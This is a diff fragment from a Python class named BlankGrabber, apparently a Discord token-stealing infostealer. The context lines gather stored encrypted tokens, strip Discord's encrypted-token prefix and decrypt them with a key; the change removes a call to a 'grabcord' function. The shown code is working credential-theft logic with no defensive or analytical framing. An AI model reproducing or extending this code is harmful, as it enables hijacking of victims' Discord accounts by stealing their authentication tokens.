@@ -300,8 +300,7 @@ class BlankGrabber:
                                 token = (token[::-1].replace("\\", "", 1))[::-1]
                             if not token in encrypted_tokens:
                                 encrypted_tokens.append(token)
-            grabcord(path)
-
+       
             for token in encrypted_tokens:
                 token = decrypt_token(base64.b64decode(token.split("dQw4w9WgXcQ:")[1]), base64.b64decode(key)[5:])
                 if token:
